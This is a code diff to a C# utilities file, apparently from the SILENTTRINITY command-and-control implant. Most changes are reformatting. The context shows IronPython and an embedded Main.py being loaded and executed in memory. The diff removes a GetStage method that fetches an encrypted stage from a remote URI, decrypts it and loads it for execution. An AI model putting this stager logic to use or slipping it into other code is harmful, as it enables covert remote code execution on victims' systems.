@@ -28,22 +28,19 @@ namespace SILENTTRINITY.Utilities
 
                     scope.SetVariable("URL", url);
                     scope.SetVariable("GUID", GUID);
-                    scope.SetVariable("IronPythonDLL", Assembly.Load(Internals.GetResourceInZip(Stage, "IronPython.dll")));
+                    scope.SetVariable("IronPythonDLL",
+                        Assembly.Load(Internals.GetResourceInZip(Stage, 
+                                      "IronPython.dll"))
+                        );
 #if DEBUG
                     scope.SetVariable("DEBUG", true);
 #elif RELEASE
                     scope.SetVariable("DEBUG", false);
 #endif
                     byte[] mainPyFile = Internals.GetResourceInZip(Stage, "Main.py");
+                    
                     engine.Execute(Encoding.UTF8.GetString(mainPyFile, 0, mainPyFile.Length), scope);
                 }
-            }
-
-            public static MemoryStream GetStage(Uri uri)
-            {
-                var key = Crypto.Base.KeyExchange(uri);
-                var stage = Crypto.Base.Decrypt(key, Http.Get(uri));
-                return new MemoryStream(stage);
             }
 
             // https://mail.python.org/pipermail/ironpython-users/2012-December/016366.html
@@ -57,6 +54,7 @@ namespace SILENTTRINITY.Utilities
                                                         ["Debug"] = false
                                                     });
                 var pyRuntime = new ScriptRuntime(setup);
+
                 ScriptEngine engineInstance = Python.GetEngine(pyRuntime);
 
                 AddPythonLibrariesToSysMetaPath(engineInstance);
@@ -74,11 +72,9 @@ namespace SILENTTRINITY.Utilities
                         where name.EndsWith(".zip", StringComparison.OrdinalIgnoreCase)
                             select name;
                     string resName = resQuery.Single();
-
 #if DEBUG
                     Console.WriteLine("\t[+] Found embedded IPY stdlib: {0}", resName);
 #endif
-
                     var importer = new ResourceMetaPathImporter(asm, resName);
                     dynamic sys = engineInstance.GetSysModule();
 
